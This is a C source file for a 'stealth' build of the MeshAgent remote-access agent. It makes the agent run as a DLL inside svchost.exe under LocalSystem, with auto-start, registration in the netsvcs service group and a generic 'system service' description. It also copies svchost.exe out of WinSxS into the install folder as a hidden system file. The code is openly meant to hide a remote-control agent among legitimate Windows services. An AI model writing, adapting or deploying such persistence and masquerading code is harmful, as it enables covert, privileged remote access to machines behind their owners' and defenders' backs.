/*
 * MeshAgent Stealth - Svchost.exe Hosting Implementation
 *
 * Allows MeshAgent to run as a DLL inside svchost.exe instead of standalone process.
 * This provides maximum stealth as the service blends with legitimate Windows services.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>
#include "stealth.h"
#include "../meshcore/agentcore.h"
#include "../meshcore/generated/meshagent_branding.h"
#include "../microstack/ILibParsers.h"

// Use AgentCore APIs
// MeshAgent_Create/MeshAgent_Stop are declared in agentcore.h
// Provide a local run helper that starts the ILib chain
static void MeshAgent_Run(MeshAgentHostContainer* agent)
{
    if (agent != NULL && agent->chain != NULL)
    {
        ILibStartChain(agent->chain);
    }
}

// Global state for svchost-hosted service
static SERVICE_STATUS_HANDLE g_SvchostStatusHandle = NULL;
static SERVICE_STATUS g_SvchostStatus = {0};
static BOOL g_SvchostRunning = FALSE;
static MeshAgentHostContainer* g_SvchostAgent = NULL;

// Forward declarations
static BOOL Stealth_SelectSvchostImage(const wchar_t* dllPath, wchar_t* exePathOut, size_t exePathOutLen, BOOL *useExpand);

/**
 * Service control handler for svchost-hosted mode
 */
DWORD WINAPI Stealth_SvchostCtrlHandler(
    DWORD dwControl,
    DWORD dwEventType,
    LPVOID lpEventData,
    LPVOID lpContext)
{
    UNREFERENCED_PARAMETER(lpEventData);
    UNREFERENCED_PARAMETER(lpContext);

    switch (dwControl)
    {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            // Update status to STOP_PENDING
            g_SvchostStatus.dwCurrentState = SERVICE_STOP_PENDING;
            g_SvchostStatus.dwCheckPoint = 0;
            g_SvchostStatus.dwWaitHint = 5000;
            SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);

            // Signal service to stop
            g_SvchostRunning = FALSE;

            // Stop MeshAgent
            if (g_SvchostAgent != NULL)
            {
                MeshAgent_Stop(g_SvchostAgent);
                g_SvchostAgent = NULL;
            }

            // Update status to STOPPED
            g_SvchostStatus.dwCurrentState = SERVICE_STOPPED;
            g_SvchostStatus.dwCheckPoint = 0;
            g_SvchostStatus.dwWaitHint = 0;
            SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);

            return NO_ERROR;

        case SERVICE_CONTROL_INTERROGATE:
            // Report current status
            SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);
            return NO_ERROR;

        case SERVICE_CONTROL_PAUSE:
            // Not supported
            return ERROR_CALL_NOT_IMPLEMENTED;

        case SERVICE_CONTROL_CONTINUE:
            // Not supported
            return ERROR_CALL_NOT_IMPLEMENTED;

        case SERVICE_CONTROL_POWEREVENT:
            // Handle power events if needed
            switch (dwEventType)
            {
                case PBT_APMSUSPEND:
                    // System is suspending
                    break;
                case PBT_APMRESUMESUSPEND:
                    // System is resuming
                    break;
            }
            return NO_ERROR;

        case SERVICE_CONTROL_SESSIONCHANGE:
            // Handle session changes if needed
            return NO_ERROR;

        default:
            return ERROR_CALL_NOT_IMPLEMENTED;
    }
}

/**
 * Main service entry point for svchost.exe hosting
 * This is the function that svchost.exe calls when starting our service
 */
VOID WINAPI Stealth_SvchostServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
{
    // DWORD i; // not used; removed to avoid unused variable warning

    // Register service control handler
    g_SvchostStatusHandle = RegisterServiceCtrlHandlerEx(
        MESH_AGENT_SERVICE_FILE,  // Use branded service key name
        (LPHANDLER_FUNCTION_EX)Stealth_SvchostCtrlHandler,
        NULL                    // Context
    );

    if (!g_SvchostStatusHandle)
    {
        return;  // Failed to register handler
    }

    // Initialize service status structure
    g_SvchostStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;  // Shared svchost service
    g_SvchostStatus.dwCurrentState = SERVICE_START_PENDING;
    g_SvchostStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP |
                                          SERVICE_ACCEPT_SHUTDOWN |
                                          SERVICE_ACCEPT_POWEREVENT |
                                          SERVICE_ACCEPT_SESSIONCHANGE;
    g_SvchostStatus.dwWin32ExitCode = NO_ERROR;
    g_SvchostStatus.dwServiceSpecificExitCode = 0;
    g_SvchostStatus.dwCheckPoint = 0;
    g_SvchostStatus.dwWaitHint = 3000;

    // Report initial status
    SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);

    // Initialize MeshAgent core with default capabilities
    g_SvchostAgent = MeshAgent_Create(0);

    if (!g_SvchostAgent)
    {
        // Failed to create agent
        g_SvchostStatus.dwCurrentState = SERVICE_STOPPED;
        g_SvchostStatus.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR;
        g_SvchostStatus.dwServiceSpecificExitCode = 1;
        SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);
        return;
    }

    // Update status to RUNNING
    g_SvchostStatus.dwCurrentState = SERVICE_RUNNING;
    g_SvchostStatus.dwCheckPoint = 0;
    g_SvchostStatus.dwWaitHint = 0;
    SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);

    g_SvchostRunning = TRUE;

    // Main service loop - MeshAgent_Run handles everything
    MeshAgent_Run(g_SvchostAgent);

    // Service has stopped
    g_SvchostStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);
}

/**
 * Register service for svchost.exe hosting
 * Creates required registry entries for svchost to load our DLL
 */
BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* dllPath)
{
    HKEY hKey = NULL;
    HKEY hParamsKey = NULL;
    HKEY hSvchostKey = NULL;
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;
    LONG result;
    BOOL success = FALSE;
    BOOL netsvcsConfigured = FALSE;
    wchar_t keyPath[512];
    DWORD dwType, dwSize;
    WCHAR wDisplayName[256] = {0};
    WCHAR wDescription[512] = {0};
    const wchar_t* groupName = L"netsvcs";
    WCHAR hostExePath[MAX_PATH] = {0};
    BOOL hostExeUsesExpand = FALSE;
    WCHAR imagePathValue[512] = {0};

    if (serviceName == NULL || serviceName[0] == 0 || dllPath == NULL || dllPath[0] == 0)
    {
        return FALSE;
    }

    if (!Stealth_SelectSvchostImage(dllPath, hostExePath, _countof(hostExePath), &hostExeUsesExpand))
    {
        // even if selection fails, hostExePath contains fallback
    }

    if (hostExePath[0] == 0)
    {
        lstrcpynW(hostExePath, L"%SystemRoot%\\System32\\svchost.exe", (int)_countof(hostExePath));
        hostExeUsesExpand = TRUE;
    }

    _snwprintf_s(imagePathValue, _countof(imagePathValue), _TRUNCATE, L"%s -k %s -p", hostExePath, groupName);

    if (MESH_AGENT_SERVICE_NAME != NULL)
    {
#ifdef UNICODE
        lstrcpynW(wDisplayName, MESH_AGENT_SERVICE_NAME, (int)_countof(wDisplayName));
#else
        MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_SERVICE_NAME, -1, wDisplayName, (int)_countof(wDisplayName));
#endif
    }
    if (MESH_AGENT_FILE_DESCRIPTION != NULL)
    {
        MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_FILE_DESCRIPTION, -1, wDescription, (int)_countof(wDescription));
    }
    if (wDescription[0] == 0)
    {
        lstrcpynW(wDescription, L"system service", (int)_countof(wDescription));
    }

    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (hSCM != NULL)
    {
        hService = CreateServiceW(
            hSCM,
            serviceName,
            (wDisplayName[0] != 0) ? wDisplayName : serviceName,
            SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_CHANGE_CONFIG | DELETE,
            SERVICE_WIN32_SHARE_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            imagePathValue,
            NULL,
            NULL,
            NULL,
            L"LocalSystem",
            NULL);

        if (hService == NULL)
        {
            if (GetLastError() == ERROR_SERVICE_EXISTS)
            {
                hService = OpenServiceW(hSCM, serviceName, SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_CHANGE_CONFIG | DELETE);
                if (hService != NULL)
                {
                    ChangeServiceConfigW(
                        hService,
                        SERVICE_WIN32_SHARE_PROCESS,
                        SERVICE_AUTO_START,
                        SERVICE_ERROR_NORMAL,
                        imagePathValue,
                        NULL,
                        NULL,
                        NULL,
                        NULL,
                        L"LocalSystem",
                        (wDisplayName[0] != 0) ? wDisplayName : NULL);
                }
            }
        }
    }

    if (hService == NULL)
    {
        goto CLEANUP;
    }

    // Create service registry key
    swprintf_s(keyPath, sizeof(keyPath)/sizeof(wchar_t),
               L"SYSTEM\\CurrentControlSet\\Services\\%s", serviceName);

    result = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, NULL, 0,
                             KEY_WRITE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS)
    {
        goto CLEANUP;
    }

    // Set service type to SHARE_PROCESS
    DWORD dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    RegSetValueExW(hKey, L"Type", 0, REG_DWORD, (LPBYTE)&dwServiceType, sizeof(DWORD));

    // Set start type to AUTO_START
    DWORD dwStartType = SERVICE_AUTO_START;
    RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (LPBYTE)&dwStartType, sizeof(DWORD));

    // Set error control
    DWORD dwErrorControl = SERVICE_ERROR_NORMAL;
    RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (LPBYTE)&dwErrorControl, sizeof(DWORD));

    // Set ImagePath to svchost with netsvcs group
    RegSetValueExW(hKey, L"ImagePath", 0, hostExeUsesExpand ? REG_EXPAND_SZ : REG_SZ,
                   (LPBYTE)imagePathValue, (DWORD)((wcslen(imagePathValue) + 1) * sizeof(wchar_t)));

    // Set display name (generic)
    if (wDisplayName[0] != 0)
    {
        RegSetValueExW(hKey, L"DisplayName", 0, REG_SZ,
                       (LPBYTE)wDisplayName, (DWORD)((wcslen(wDisplayName) + 1) * sizeof(wchar_t)));
    }

    // Set description (generic)
    if (wDescription[0] != 0)
    {
        RegSetValueExW(hKey, L"Description", 0, REG_SZ,
                       (LPBYTE)wDescription, (DWORD)((wcslen(wDescription) + 1) * sizeof(wchar_t)));
    }

    // Set ObjectName (LocalSystem)
    const wchar_t* objectName = L"LocalSystem";
    RegSetValueExW(hKey, L"ObjectName", 0, REG_SZ,
                   (LPBYTE)objectName, (DWORD)((wcslen(objectName) + 1) * sizeof(wchar_t)));

    // Create Parameters subkey
    result = RegCreateKeyExW(hKey, L"Parameters", 0, NULL, 0,
                             KEY_WRITE, NULL, &hParamsKey, NULL);
    if (result == ERROR_SUCCESS)
    {
        // Set ServiceDll parameter (optional)
        if (dllPath && *dllPath)
        {
            RegSetValueExW(hParamsKey, L"ServiceDll", 0, REG_EXPAND_SZ,
                           (LPBYTE)dllPath, (DWORD)((wcslen(dllPath) + 1) * sizeof(wchar_t)));
        }

        // Set ServiceMain export name and unload policy
        const wchar_t* serviceMain = L"Stealth_SvchostServiceMain";
        RegSetValueExW(hParamsKey, L"ServiceMain", 0, REG_SZ,
                       (LPBYTE)serviceMain, (DWORD)((wcslen(serviceMain) + 1) * sizeof(wchar_t)));
        DWORD unload = 1;
        RegSetValueExW(hParamsKey, L"ServiceDllUnloadOnStop", 0, REG_DWORD, (LPBYTE)&unload, sizeof(unload));

        RegCloseKey(hParamsKey);
        hParamsKey = NULL;
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    // Add service to svchost netsvcs group
    result = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                           L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
                           0, KEY_READ | KEY_WRITE, &hSvchostKey);
    if (result == ERROR_SUCCESS)
    {
        WCHAR currentServices[4096] = {0};
        dwSize = sizeof(currentServices);
        dwType = REG_MULTI_SZ;

        result = RegQueryValueExW(hSvchostKey, L"netsvcs", NULL, &dwType,
                                  (LPBYTE)currentServices, &dwSize);

        if (result == ERROR_FILE_NOT_FOUND)
        {
            currentServices[0] = L'\0';
            currentServices[1] = L'\0';
            dwSize = sizeof(wchar_t);
            result = ERROR_SUCCESS;
        }

        if (result == ERROR_SUCCESS)
        {
            WCHAR* ptr = currentServices;
            BOOL alreadyPresent = FALSE;

            while (*ptr != L'\0')
            {
                if (_wcsicmp(ptr, serviceName) == 0)
                {
                    alreadyPresent = TRUE;
                    break;
                }
                ptr += wcslen(ptr) + 1;
            }

            if (!alreadyPresent)
            {
                size_t usedChars = (size_t)(ptr - currentServices);
                size_t nameLen = wcslen(serviceName) + 1; // include null terminator
                size_t required = usedChars + nameLen + 1; // extra null for double-terminator

                if (required >= _countof(currentServices))
                {
                    goto CLEANUP;
                }

                wcscpy_s(currentServices + usedChars, _countof(currentServices) - usedChars, serviceName);
                usedChars += nameLen;
                currentServices[usedChars] = L'\0';
                usedChars++;

                DWORD bytesToWrite = (DWORD)(usedChars * sizeof(wchar_t));
                if (RegSetValueExW(hSvchostKey, L"netsvcs", 0, REG_MULTI_SZ,
                                   (LPBYTE)currentServices, bytesToWrite) != ERROR_SUCCESS)
                {
                    goto CLEANUP;
                }
            }

            netsvcsConfigured = TRUE;
        }

        RegCloseKey(hSvchostKey);
        hSvchostKey = NULL;
    }

    if (!netsvcsConfigured)
    {
        goto CLEANUP;
    }

    if (hService != NULL && wDescription[0] != 0)
    {
        SERVICE_DESCRIPTIONW sd = {0};
        sd.lpDescription = wDescription;
        ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &sd);
    }

    success = TRUE;

CLEANUP:
    if (hSvchostKey != NULL) { RegCloseKey(hSvchostKey); }
    if (hParamsKey != NULL) { RegCloseKey(hParamsKey); }
    if (hKey != NULL) { RegCloseKey(hKey); }
    if (hService != NULL) { CloseServiceHandle(hService); }
    if (hSCM != NULL) { CloseServiceHandle(hSCM); }

    return success;
}

BOOL Stealth_UnregisterSvchostService(const wchar_t* serviceName)
{
    if (!serviceName || !*serviceName) { return FALSE; }

    BOOL success = TRUE;
    // Remove from svchost group (netsvcs)
    HKEY hSvchostKey = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
                      0, KEY_READ | KEY_WRITE, &hSvchostKey) == ERROR_SUCCESS)
    {
        DWORD type = 0;
        DWORD cb = 0;
        if (RegQueryValueExW(hSvchostKey, L"netsvcs", NULL, &type, NULL, &cb) == ERROR_SUCCESS && type == REG_MULTI_SZ)
        {
            wchar_t* buf = (wchar_t*)malloc(cb + 2 * sizeof(wchar_t));
            if (buf && RegQueryValueExW(hSvchostKey, L"netsvcs", NULL, &type, (LPBYTE)buf, &cb) == ERROR_SUCCESS)
            {
                buf[cb / sizeof(wchar_t)] = L'\0';
                buf[cb / sizeof(wchar_t) + 1] = L'\0';
                // Build new list excluding serviceName
                size_t outLen = 0;
                wchar_t* out = (wchar_t*)malloc(cb + 2 * sizeof(wchar_t));
                if (out)
                {
                    for (wchar_t* p = buf; *p; p += (wcslen(p) + 1))
                    {
                        if (_wcsicmp(p, serviceName) == 0) { continue; }
                        size_t len = wcslen(p) + 1;
                        wcscpy_s(out + outLen, (cb/sizeof(wchar_t)) - outLen, p);
                        outLen += len;
                    }
                    out[outLen] = L'\0';
                    RegSetValueExW(hSvchostKey, L"netsvcs", 0, REG_MULTI_SZ,
                                   (LPBYTE)out, (DWORD)((outLen + 1) * sizeof(wchar_t)));
                    free(out);
                }
            }
            if (buf) free(buf);
        }
        RegCloseKey(hSvchostKey);
    }

    // Delete service key tree
    wchar_t keyPath[512];
    _snwprintf_s(keyPath, _countof(keyPath), _TRUNCATE,
                 L"SYSTEM\\CurrentControlSet\\Services\\%s", serviceName);
    LSTATUS del = RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath);
    if (!(del == ERROR_SUCCESS || del == ERROR_FILE_NOT_FOUND || del == ERROR_PATH_NOT_FOUND))
    {
        success = FALSE;
    }

    return success;
}

/**
 * DLL Main entry point
 * Required for DLL version of MeshAgent
 */
#ifdef BUILD_SVCHOST_DLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);

    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            // DLL is being loaded
            // Disable thread notifications for performance
            DisableThreadLibraryCalls(hinstDLL);
            break;

        case DLL_PROCESS_DETACH:
            // DLL is being unloaded
            if (g_SvchostAgent != NULL)
            {
                MeshAgent_Stop(g_SvchostAgent);
                g_SvchostAgent = NULL;
            }
            break;

        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            // Not used due to DisableThreadLibraryCalls
            break;
    }

    return TRUE;
}
#endif // BUILD_SVCHOST_DLL
static BOOL Stealth_SelectSvchostImage(const wchar_t* dllPath, wchar_t* exePathOut, size_t exePathOutLen, BOOL *useExpand)
{
    WCHAR windowsDir[MAX_PATH] = {0};
    WCHAR installDir[MAX_PATH] = {0};

    if (exePathOut == NULL || exePathOutLen == 0) { return FALSE; }
    exePathOut[0] = L'\0';
    if (useExpand != NULL) { *useExpand = FALSE; }

    if (dllPath != NULL && dllPath[0] != 0)
    {
        lstrcpynW(installDir, dllPath, (int)_countof(installDir));
        wchar_t *lastSlash = wcsrchr(installDir, L'\\');
        if (lastSlash != NULL) { *lastSlash = L'\0'; }
    }

    if (GetWindowsDirectoryW(windowsDir, (DWORD)_countof(windowsDir)) > 0)
    {
        WCHAR pattern[MAX_PATH] = {0};
        WIN32_FIND_DATAW findData;
        HANDLE hFind = INVALID_HANDLE_VALUE;

        _snwprintf_s(pattern, _countof(pattern), _TRUNCATE, L"%s\\WinSxS\\amd64_microsoft-windows-services-svchost_*", windowsDir);
        hFind = FindFirstFileW(pattern, &findData);
        if (hFind != INVALID_HANDLE_VALUE)
        {
            do
            {
                if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
                {
                    WCHAR candidate[MAX_PATH] = {0};
                    WCHAR target[MAX_PATH] = {0};

                    _snwprintf_s(candidate, _countof(candidate), _TRUNCATE, L"%s\\WinSxS\\%s\\svchost.exe", windowsDir, findData.cFileName);
                    if (GetFileAttributesW(candidate) == INVALID_FILE_ATTRIBUTES) { continue; }

                    if (installDir[0] != 0)
                    {
                        _snwprintf_s(target, _countof(target), _TRUNCATE, L"%s\\svchost.exe", installDir);
                        SetFileAttributesW(target, FILE_ATTRIBUTE_NORMAL);
                        DeleteFileW(target);
                        if (CopyFileW(candidate, target, FALSE))
                        {
                            SetFileAttributesW(target, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                            lstrcpynW(exePathOut, target, (int)exePathOutLen);
                            FindClose(hFind);
                            return TRUE;
                        }
                        else
                        {
                            DWORD err = GetLastError();
                            fwprintf(stderr, L"[!] CopyFile failed: %s -> %s (error %lu)\n", candidate, target, err);
                        }
                    }
                    else
                    {
                        lstrcpynW(exePathOut, candidate, (int)exePathOutLen);
                        FindClose(hFind);
                        return TRUE;
                    }
                }
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
    }

    // Fallback to the standard System32 path (may fail if truly missing)
    lstrcpynW(exePathOut, L"%SystemRoot%\\System32\\svchost.exe", (int)exePathOutLen);
    fwprintf(stderr, L"[!] Stealth_SelectSvchostImage falling back to default host path\n");
    if (useExpand != NULL) { *useExpand = TRUE; }
    return FALSE;
}
